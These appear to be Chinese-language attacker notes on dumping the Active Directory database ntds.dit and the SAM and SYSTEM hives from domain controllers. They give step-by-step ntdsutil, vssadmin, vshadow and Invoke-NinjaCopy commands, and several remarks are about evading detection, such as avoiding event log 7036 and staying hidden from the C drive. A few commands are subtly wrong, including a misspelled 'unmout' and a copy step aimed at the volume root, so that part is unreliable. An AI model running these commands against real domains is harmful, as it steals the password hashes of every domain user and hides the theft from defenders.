Volume Shadow Copy

活动目录数据库

ntds.dit。包括域用户，组，组成员身份信息，还包括域所有用户密码的哈希值。破解sam文件和ntds.dit文件都需要拥有一个system文件。

AD DS数据存储：

  1. 由ntds.dit文件构成
  2. 默认存储在所有域控制器上的%SystemRoot%\NTDS文件夹中
  3. 只能通过域控制器进程和协议访问（windows组织对这些文件的标准读取或复制，需要特殊技术获取副本）

VSC Service

是微软从XP开始用于创建一致性时间点副本（快照）的服务框架。它用于数据备份，支持2003及以上的系统，禁用VSS会影响系统正常使用如System Restore。

Ntdsutil

是为AD提供管理设施的命令行工具，域环境默认安装。这样可以绕过system进程取得文件。

1ntdsutil
2snapshot #快照模式
3activate instance ntds #激活实例
4create #创建快照
5mount [GUID] #挂载快照(备份)
6unmout [GUID] #copy完文件之后再执行卸载
7del [GUID]
8quit
9quit

非交互式：（chcp 65001 切换utf8编码，防止metepreter乱码。）

 1#查询当前的系统的快照
 2ntdsutil snapshot "List All" quit quit 
 3ntdsutil snapshot "List Mounted" quit quit

命令执行如果报错了可能是服务的关系，设置相关服务为自动。

vssadmin

Windows系统提供的VSS管理工具，域环境默认安装。不会直接生成在C盘上有一定隐蔽性。

  1. 查询当前系统快照：vssadmin list shadows
  2. 创建C盘快照： vssadmin create shadow /for=c:
  3. 获得Shadow Copy Volume Name（不会直接生成在C盘上）：\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
  4. 变为目录:mklink /d c:\hhh \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
  5. 复制ntds.dit：copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1 c:\ntds3.dit
  6. 删除快照：vssadmin delete shadows /for=c: /quiet

vshadow

允许任何人创建卷影拷贝，系统默认不支持，可以在Microsoft Windows SDK中获得该工具。

1#查询快照
2vshadow.exe -q

NinjaCopy

获得NTDS.dit文件，没有调用VSC服务，所以不会产生日志文件7036。需要下载这个文件再Import。 各种ps脚本：

https://github.com/samratashok/nishang

https://github.com/PowerShellMafia/PowerSploit

1#需要具有权限
2Import-Module .\invoke-NinjaCopy.ps1
3
4#导出这三个文件
5Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination .\sam.hive
6Invoke-NinjaCopy -Path C:\Windows\System32\config\SYSTEM -LocalDestination .\system.hive
7Invoke-NinjaCopy -Path C:\windows\ntds\ntds.dit -LocalDestination "C:\Users\Administrator\Desktop\ntds.dit"
